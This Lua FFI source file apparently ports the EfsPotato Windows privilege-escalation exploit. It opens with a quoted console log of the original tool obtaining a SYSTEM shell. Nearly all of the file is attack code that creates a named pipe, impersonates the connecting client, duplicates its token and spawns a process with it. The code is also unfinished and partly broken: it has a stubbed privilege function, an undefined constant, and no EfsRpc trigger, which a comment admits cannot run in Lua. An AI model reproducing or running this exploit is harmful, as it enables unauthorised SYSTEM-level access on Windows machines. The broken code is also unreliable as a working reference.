--[[ PS C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug> .\EfsPotato.exe -i -c cmd.exe

[>] Trying to create named pipe.
[+] Named pipe is created successfully.
    [*] Path : \\.\pipe\{1306D9C6-4BAE-4527-9F0B-75B32A74E054}\pipe\srvsvc
[>] Waiting for named pipe connection.
[>] Calling EfsRpcEncryptFileSrv().
    [*] Target File Path   : \\localhost/pipe/{1306D9C6-4BAE-4527-9F0B-75B32A74E054}\C$\PrivFu.txt
    [*] Endpoint Pipe Name : \pipe\efsrpc
[+] Got named pipe connection.
[+] Named pipe impersonation is successful (SID: S-1-5-18).
[+] SYSTEM process is executed successfully (PID = 28224).
Microsoft Windows [Version 10.0.22621.2715]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug>
]] --

-- Load the FFI library for Windows API
local ffi = require("ffi")

-- include libraries via DLL.
local kernel32 = ffi.load("kernel32")
local advapi32 = ffi.load("advapi32")

-- Define necessary Windows API types and functions
ffi.cdef[[
typedef int BOOL;
typedef char* LPSTR;
typedef void* LPVOID;
typedef uint32_t DWORD;
typedef void* HANDLE;
typedef int32_t INT;
typedef uint32_t UINT;
typedef int64_t LARGE_INTEGER;
typedef uint32_t ULONG;
typedef uint32_t ULONG_PTR;
typedef uint16_t WORD;
typedef void* LPBYTE;
typedef int NTSTATUS;
typedef wchar_t WCHAR;
typedef const wchar_t* LPCWSTR;
typedef wchar_t* LPWSTR;
typedef const char* LPCSTR;

enum ACCESS_MASK {
    NO_ACCESS = 0, // Add other access mask values if needed
};

enum DUPLICATE_OPTION_FLAGS {
    SAME_ACCESS = 0x2,    // Add other duplicate option flags if needed
};

NTSTATUS NtDuplicateObject(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    HANDLE* TargetHandle,
    enum ACCESS_MASK DesiredAccess,
    unsigned long HandleAttributes,
    enum DUPLICATE_OPTION_FLAGS Options
);

typedef struct {
    uintptr_t Internal;
    uintptr_t InternalHigh;
    union {
        struct {
            uint32_t Offset;
            uint32_t OffsetHigh;
        } DUMMYSTRUCTNAME;
        void* Pointer;
    } DUMMYUNIONNAME;
    HANDLE hEvent;
} OVERLAPPED;

typedef struct _STARTUPINFO {
    DWORD  cb;
    char* lpReserved;  // or wchar_t* lpReserved;
    char* lpDesktop;   // or wchar_t* lpDesktop;
    char* lpTitle;     // or wchar_t* lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFO, *LPSTARTUPINFO;

typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;

HANDLE CreateNamedPipeA(
    LPSTR lpName, 
    DWORD dwOpenMode, 
    DWORD dwPipeMode, 
    DWORD nMaxInstances, 
    DWORD nOutBufferSize, 
    DWORD nInBufferSize, 
    DWORD nDefaultTimeOut, 
    LPVOID lpSecurityAttributes
);
BOOL ConnectNamedPipe(HANDLE hNamedPipe, LPVOID lpOverlapped);
DWORD GetLastError();
BOOL ImpersonateNamedPipeClient(HANDLE hNamedPipe);
BOOL CloseHandle(HANDLE hObject);
INT DuplicateTokenEx(HANDLE hToken, DWORD dwDesiredAccess, LPVOID lpTokenAttributes, INT ImpersonationLevel, INT TokenType, LPVOID phNewToken);
HANDLE GetCurrentProcess();
ULONG WaitForSingleObject(HANDLE hHandle, ULONG dwMilliseconds);
DWORD CreateProcessWithTokenW(HANDLE hToken, DWORD dwLogonFlags, LPSTR lpApplicationName, LPSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPSTR lpCurrentDirectory, LPVOID lpStartupInfo, LPVOID lpProcessInformation);
DWORD NtSetInformationToken(HANDLE TokenHandle, INT TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
HANDLE CreateEventA(void*, int, int, const char*);
int SetEvent(HANDLE);
HANDLE OpenProcess(
    unsigned long dwDesiredAccess,
    int bInheritHandle,
    unsigned long dwProcessId
);
int OpenProcessToken(
    HANDLE ProcessHandle,
    unsigned long DesiredAccess,
    HANDLE* TokenHandle
);
int GetCurrentProcessId();

HANDLE CreateProcessAsUserA(
    HANDLE hToken,
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    void* lpProcessAttributes,
    void* lpThreadAttributes,
    int bInheritHandles,
    unsigned long dwCreationFlags,
    void* lpEnvironment,
    LPCSTR lpCurrentDirectory,
    const STARTUPINFO* lpStartupInfo,
    PROCESS_INFORMATION* lpProcessInformation
);
]]

-- Constants and variables
local PIPE_ACCESS_DUPLEX = 0x00000003
local PIPE_TYPE_BYTE = 0x00000000
local PIPE_READMODE_BYTE = 0x00000000
local NMPWAIT_USE_DEFAULT_WAIT = 0x00000000
local FILE_FLAG_OVERLAPPED = 0x40000000
local TOKEN_ASSIGN_PRIMARY = 0x0001
local TOKEN_DUPLICATE = 0x0002
local GENERIC_ALL = 0x10000000
local CREATE_NEW_CONSOLE = 0x00000010
local EVENT_ALL_ACCESS = 0x1F0003
local CREATE_EVENT_MANUAL_RESET = 0x0001
local CREATE_EVENT_INITIAL_STATE = 0x0002

-- endpoint pipe name
local endpointPipeName = "efsrpc"

function generateGUID()
    local template ='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
    return string.gsub(template, '[xy]', function (c)
        local v = (c == 'x') and math.random(0, 0xf) or math.random(8, 0xb)
        return string.format('%x', v)
    end)
end

function DuplicateCurrentToken()
    local hProcess = ffi.C.GetCurrentProcess()
    local hToken = ffi.new("HANDLE[1]")

    if advapi32.OpenProcessToken(hProcess, bit.bor(TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE), hToken) == 0 then
        local error = ffi.C.GetLastError()
        print("[-] Failed to open process token.")
        print("    |-> Error: " .. error)
        return nil
    end

    return hToken[0]
end

-- Function to create a new named pipe
local function createNamedPipe(pipeName)
    print("createNamedPipe called with " .. pipeName)
    local hPipe = ffi.C.CreateNamedPipeA(
        ffi.cast("LPSTR", pipeName),  -- Use ffi.cast to convert Lua string to LPSTR
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE,
        1, -- Max instances
        0, -- Out buffer size
        0, -- In buffer size
        NMPWAIT_USE_DEFAULT_WAIT,
        nil
    )
    if hPipe == ffi.cast("HANDLE", ffi.cast("uintptr_t", -1)) then
        local error = ffi.C.GetLastError()
        print("[-] Failed to create named pipe")
        print("    |-> Error: " .. error)
        return nil
    else
        print("[+] Named pipe is created successfully.")
        print("    [*] Path : " .. pipeName)  -- Use the 'pipeName' argument instead of the char pointer
    end
    return hPipe
end

-- default options
local sessionId = 0 
local interactive = true

-- Function to enable token privileges (You need to implement this function)
local function enableTokenPrivileges()
    -- Implement this function using the C APIs
    -- You will need to retrieve the current process token, adjust privileges, etc.
    return true;
end

-- Function to check if an element is in a table
local function contains(table, element)
    for _, value in ipairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

-- Function to connect named pipe
local function connectNamedPipe(hPipe)
    local overlapped = ffi.new("OVERLAPPED")
    overlapped.hEvent = ffi.C.CreateEventA(nil, true, false, nil)
    if not ffi.C.ConnectNamedPipe(hPipe, overlapped) then
        local error = ffi.C.GetLastError()
        if error ~= ERROR_IO_PENDING then
            print("[-] Failed to connect named pipe")
            print("    |-> Error: " .. error)
            ffi.C.CloseHandle(overlapped.hEvent)
            return false
        end
    end
    print("[+] Waiting for named pipe connection.")
    ffi.C.WaitForSingleObject(overlapped.hEvent, 10000)
    ffi.C.CloseHandle(overlapped.hEvent)
    print("[+] Got named pipe connection.")
    return true
end

-- Function to impersonate named pipe client
local function impersonateNamedPipeClient(hPipe)
    if not advapi32.ImpersonateNamedPipeClient(hPipe) then
        local error = ffi.C.GetLastError()
        print("[-] Failed to named pipe impersonation.")
        print("    |-> Error: " .. error)
        return false
    else
        -- could get the SID before this.
        print("[+] Named pipe impersonation is successful")
        ffi.C.CloseHandle(hPipe)
        hPipe = ffi.cast("HANDLE", ffi.cast("uintptr_t", -1))  -- Corrected the error in this line
        return true
    end
end

-- Function to duplicate the current token (You need to implement this function)
local function duplicateCurrentToken()
    local hToken = ffi.new("HANDLE[1]")
    local existingToken = DuplicateCurrentToken()
    if advapi32.DuplicateTokenEx(existingToken, bit.bor(TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE), nil, 2, 1, hToken) == 0 then
        local error = ffi.C.GetLastError()
        print("[-] Failed to duplicate the current token.")
        print("    |-> Error: " .. error)
        return nil
    end
    return hToken[0]
end

-- Function to create a process with a token
local function createProcessWithToken(hToken, command, startupInfo, processInformation)
    local lpCommandLine = ffi.cast("LPSTR", command)
    if ffi.C.CreateProcessAsUserA(
        hToken,
        nil,
        lpCommandLine,
        nil,
        nil,
        false,
        0, -- Flags, you can customize this based on your needs
        nil,
        ffi.NULL,
        startupInfo,
        processInformation
    ) == 0 then
        local error = ffi.C.GetLastError()
        print("[-] Failed to spawn process with user token.")
        print("    |-> Error: " .. error)
        return false
    else
        print("[+] Process with user token is executed successfully (PID = " .. processInformation.dwProcessId .. ").")
        return true
    end
end

-- Entry point for the GetSystem function
local function GetSystem(command, endpointPipeName)
    -- Check if the endpoint pipe name is valid
    local validEndpoints = {"efsrpc", "lsarpc", "lsass", "netlogon", "samr"}
    if not contains(validEndpoints, endpointPipeName:lower()) then
        print("[-] Invalid endpoint pipe name is specified.")
        return false
    else
        endpointPipeName = endpointPipeName:lower()
    end

    -- Check if both sessionId and interactive flags are specified
    if sessionId > 0 and interactive then
        print("[!] Session ID and interactive mode flag must not be specified at once.")
        return false
    end

    -- Enable necessary token privileges (You need to implement this function)
    if not enableTokenPrivileges() then
        return false
    end

    -- Generate a GUID and use it in the userPipeName string
    local userPipeName = generateGUID()
    local pipeName = string.format("\\\\.\\pipe\\%s\\pipe\\srvsvc", ffi.string(userPipeName))
    local hPipe = createNamedPipe(pipeName)

    -- this requires multi-threading which cant happen in Lua, another thread calls the RPC method.
    if hPipe then
        if connectNamedPipe(hPipe) then
            if impersonateNamedPipeClient(hPipe) then
                local hDupToken = duplicateCurrentToken()
                local startupInfo = ffi.new("STARTUPINFO")
                startupInfo.cb = ffi.sizeof("STARTUPINFO")
                local processInformation = ffi.new("PROCESS_INFORMATION")
                if not createProcessWithToken(hDupToken, command, startupInfo, processInformation) then
                    -- Handle the error
                end
                ffi.C.CloseHandle(hDupToken)
            end
        end
    end

    if hPipe then
        ffi.C.CloseHandle(hPipe)
    end

    print("[*] Done.")
end

-- Call the GetSystem function
GetSystem("calc.exe", "efsrpc")